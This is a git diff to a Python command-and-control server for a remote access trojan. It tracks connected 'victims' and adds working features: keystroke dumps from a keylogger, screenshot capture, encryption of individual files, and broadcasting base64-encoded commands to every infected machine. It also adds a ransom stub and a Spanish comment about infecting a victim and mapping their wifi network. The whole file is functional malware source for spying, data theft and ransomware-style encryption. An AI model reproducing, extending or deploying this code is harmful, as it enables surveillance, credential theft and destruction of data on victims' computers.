@@ -31,7 +31,7 @@ victims = {
     'target': [],
     'os': []
 }
-
+#En plan, infectas el ordenador víctima con el malware, y, una vez infectado, te haga un resumen de todos los dispositivos conectados a la red wifi del dispositivo de la víctima
 
 def crte():
     return b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMyakNDQWNLZ0F3SUJBZ0lVY2wvZmZVbVc1NlE4cDlFU2VrdnlkVWhFOWJRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF3d05LaTVsZUdGdGNHeGxMbU52YlRBZUZ3MHlNekE1TURZeU1EQXhOVFJhRncweQpOREE1TURVeU1EQXhOVFJhTUJneEZqQVVCZ05WQkFNTURTb3VaWGhoYlhCc1pTNWpiMjB3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUNvOStBTWw0aVpvTzdEZzd5QTB4cUcyaHRGTnZwUExxT3gKbkk1bkNCWVR6azFqV1ZvcjcycXZNOW9iR0lIeG1CWUJ1YXRIS0V0NXJWTzRLNXB2b1NrekdhT3NmUUtYbzcyYgp5TmRYemFKUVN3WFZSSldkcEs1cnpjZlhqdUp3U3BtcHlpN2J5YXlyNlpmNFhPNk1rSFJoNWEzWkNXN1JJSk9MCmJSRndyLzRtWDM2VnU5SVBPdUk0cWFxWmlSa004WmpnUnZ6QWhXaDNubm1hcEtnb3JQSnUwSDNhblBZTkxYU2oKMU5sWUg4MGFQMTQwZkFOaG9zbjRFbHdtRjY1V2xhNU1USlJlbXpxbG5OczA0OTBGOUVxL1hRbkVTS0hRditBKwpOY21abE1rL1pHd2xVWnovbUgxdGt3VkgrZXJnYXBMMk0vR2FPK09MWjdqU2NLU2E3SmVuQWdNQkFBR2pIREFhCk1CZ0dBMVVkRVFRUk1BK0NEU291WlhoaGJYQnNaUzVqYjIwd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFFUHgKeEx3dFdndWcxYkNsaG5hRUFoRU1iL2hBNDBsbE5nSU5sOVptWk5LMUFBZUU0bjVaZ2tzSWZaV1dlUmVYT0p2VQp1TkhON3JFRnAwWktKNmNsSjVPOUk5eG5aU3gzbms4UVN5eFl2RE56Y0QyYTlEMklCcmYwZFROUnJUam8vdlozClBHVythL0lnaWI0dCs1SkljOTV3NEN1S210NFpoT3ZxZmo0bkZXYWpkbjdIZ0lvRnNjeGRVZW82aU00aHArcWcKOU94M0JJRVVTWFg4bDFCdFVodXYyaVZUTTJTdDRXMmk4N1BUVTlDcEMzQ3hYaHpmUHdhNkVNK25uSE9oRkNwQQpvcTI0cVEwS2svckczZVluRCtRTnhHRXdPekF0Q3YzUTZZNlVvMXV1TVNqUDgwaXJtVjREeFlPRFVpUkRaRjZiClNYZWRRcVREVTgyTi96WGpXdVE9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K'
@@ -94,23 +94,27 @@ def help_option():
                     ---------------------------------------------------------
                     | [!>] exec <command>  -> Exec command in no shell mode
                     ---------------------------------------------------------
-                    | [!>] cryptDir <dir>  ->  Crypt a full folder in target
+                    | [!>] cryptDir <dir>  -> Crypt a full folder in target
+                    ---------------------------------------------------------
+                    | [!>] crypt <file>    -> Crypt a file in target
+                    ---------------------------------------------------------
+                    | [!>] keylog_dump     -> Dump The Keystrokes From Keylogger
+                    ---------------------------------------------------------
+                    | [!>] screenshot      -> Take a screenshot
                     ---------------------------------------------------------
                     | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                     ---------------------------------------------------------
                     | [!>] destruction     -> (N/A) Eliminate all and close conect
-                    ---------------------------------------------------------
-                    | [!>] screenshot      -> (N/A) Take a screenshot
-                    ---------------------------------------------------------
-                    | [!>] keylog_dump     -> (N/A) Dump The Keystrokes From Keylogger
-                    ---------------------------------------------------------
-                    | [!>] crypt <file>    -> (N/A) Crypt a file in target
-                    ---------------------------------------------------------
+                    --------------------------------------------------------- 
                     | [!>] q               -> Suspend the conection
                     ---------------------------------------------------------
                     | [!>] exit            -> Terminate the conection
                     ---------------------------------------------------------
     ''')
+
+
+def startRansom():
+    pass
 
 
 def start(serverSock, promt):
@@ -125,7 +129,6 @@ def start(serverSock, promt):
             victims['target'].append(conn)
             victims['os'].append(init_guess(ip[0]))
             print(f"\n{Y}[>]{R} New Connection From: {END}{ip}")
-            print(f"\n\t{promt}", end="")
         except Exception as e:
             pass
 
@@ -298,7 +301,7 @@ def getAllFiles(targetConn, command, ip):
     while True:
         # Recibe la ruta del archivo desde el cliente
         relative_path = targetConn.recv(1024).decode()
-        if relative_path == 'DONE':
+        if relative_path == 'done':
             # El cliente ha terminado de enviar archivos
             break
 
@@ -416,6 +419,108 @@ def cryptDir(targetConn, command):
         print(f"\n\t{Y}[*>] {R}Dir Crypted Unsuccessfully{END}\n")
 
 
+def reciveKeylog(targetConn):
+    codedCommand = "a2V5bG9nX2R1bXAK"
+    targetConn.send(codedCommand.encode())
+    keylog_data = "".encode()
+    done = False
+
+    # Datos de da barra de carga
+    received = 0
+    total_received = 0
+    progress_bar_length = 20
+    progress = 0
+
+    sys.stdout.write(Y + "\nRecibiendo datos: [" + Fore.RESET)
+    while True:
+        chunk = targetConn.recv(1024)
+        keylog_data += chunk
+        total_received += len(chunk)
+
+        if '[+] Keylog sent successfully.'.encode() in keylog_data:
+            keylog_data = keylog_data.replace('"[+] Keylog sent successfully."'.encode(), b"")
+            done = True
+            break
+
+        else:
+            received += len(chunk)
+            new_progress = int(progress_bar_length * received / total_received)
+            if new_progress > progress:
+                sys.stdout.write(R + "▓" * (new_progress - progress))
+                sys.stdout.flush()
+                progress = new_progress
+
+    # Printeamos la ultima parte de la barra
+    if progress < progress_bar_length:
+        sys.stdout.write("▓" * (progress_bar_length - progress))
+    sys.stdout.write(Y + "]\n" + Fore.RESET)
+
+    with open("./DATA/keylog.txt", "ab") as keylog:
+        keylog.write(keylog_data)
+
+    if done:
+        print(Y + "\n\t[" + R + "+" + Y + "] " + G +
+              "Recived Keylog Dump Succesfully!\n" + Fore.RESET)
+    else:
+        print(Y + "\n\t[" + B + "-" + Y + "] " + CY +
+              "Recived Keylog Dump Unsuccesfully!\n" + Fore.RESET)
+
+
+def reciveScreenshot(targetConn, ip):
+    codedCommandd = "c2NyZWVuc2hvdAo=".encode()
+    targetConn.send(codedCommandd)
+    counter = 0
+    screenshot_filename = f"screenshot_received-{counter}.png"
+
+    with open(f"./DATA/{ip[0]}/" + screenshot_filename, 'wb') as file_screenshot:
+        received = 0
+        total_received = 0
+        progress_bar_length = 20
+        progress = 0
+        sys.stdout.write(Fore.YELLOW + "\nRecibiendo datos: [" + Fore.RESET)
+        sys.stdout.flush()
+
+        while True:
+            data = targetConn.recv(1024)
+            if "[+] Screenshot sent successfully.".encode() in data or not data:
+                data = data.replace('"[+] Screenshot sent successfully."'.encode(), "".encode())
+                file_screenshot.write(data)
+                break
+            file_screenshot.write(data)
+
+            total_received += len(data)
+            received += len(data)
+            new_progress = int(progress_bar_length * received / total_received)
+
+            if new_progress > progress:
+                sys.stdout.write(R + "▓" * (new_progress - progress))
+                sys.stdout.flush()
+                progress = new_progress
+
+        if progress < progress_bar_length:
+            sys.stdout.write("▓" * (progress_bar_length - progress))
+        sys.stdout.write(Y + "]\n" + Fore.RESET)
+
+    print(Y + "\n\t[" + R + "+" + Y + "] " + G +
+          f"Screenshot Saved As 'DATA/{ip[0]}/{screenshot_filename}'!\n" + Fore.RESET)
+
+    counter += 1
+
+
+def cryptFile(targetConn, command):
+    codedCommand = command.replace("crypt", "Y3J5cHQK")
+    targetConn.send(codedCommand.encode())
+    result = targetConn.recv(1024)
+    if result == "True".encode():
+        print(
+            Y + "\n\t[" + R + "+" + Y + "] " + R +
+            "File Crypted Sucsessfully \n" + Fore.RESET)
+    else:
+        print(
+            Y + "\n\t[" + B + "-" + Y + "] " + R +
+            f" File Crypted Unsuccsefully \n\t{result}\n" + Fore.RESET)
+
+
 def mainFunctions(ip, targetConn, ses):
     try:
         cachedCommands = {'commands': {}}
@@ -466,15 +571,52 @@ def mainFunctions(ip, targetConn, ses):
             elif command.startswith("lowpersistence"):
                 lowPersistence(targetConn)
 
-            elif command.startswith("cryptDir"):
+            elif command[:8] == "cryptDir":
                 cryptDir(targetConn, command)
+
+            elif command[:5] == "crypt":
+                cryptFile(targetConn, command)
 
             elif command.startswith('shell'):
                 shell(targetConn, ip)
 
+            elif command.startswith("keylog_dump"):
+                reciveKeylog(targetConn)
+
+            elif command.startswith("screenshot"):
+                reciveScreenshot(targetConn, ip)
+
+
+            elif command.startswith("ransom"):
+                startRansom()
+
     except BrokenPipeError as e:
         print(f"\n{R}[>!] ERROR:{Y} {e}\n")
         closeConn(targetConn, ses)
+
+
+def sendAll(command):
+    command = command.replace("sendall", "")
+    codedCommandSplit = command.split(" ")
+    stringformed = base64.b64encode((codedCommandSplit[1] + '\n').encode()).decode().strip()
+
+    if codedCommandSplit[2:]:
+        for strg in codedCommandSplit[2:]:
+            stringformed += ' ' + strg
+
+    codedCommand = stringformed
+    sess = 0
+    for target in victims['target']:
+        target.send(f"{codedCommand}".encode())
+
+        resp = target.recv(1024)
+        if "done".encode() in resp or "end".encode() in resp or "n".encode() in resp or "successfully".encode() in resp:
+            print(f"\n\t{B}Info: {Y}Command sent successfully on session {sess}-{victims['ip'][sess]}\n")
+            #print(f"{Y}Response: {B}{respComm}")
+            continue
+        else:
+            print(f"\n\t{R}ERROR: {Y}Command sent UnSuccessfully on session {sess}-{victims['ip'][sess]}\n")
+        sess += 1
 
 
 def server(serverSock):
@@ -490,6 +632,9 @@ def server(serverSock):
 
         elif "session" in cmd or "target" in cmd:
             setSession(cmd)
+
+        elif "sendall" in cmd:
+            sendAll(cmd)
 
         else:
             continue
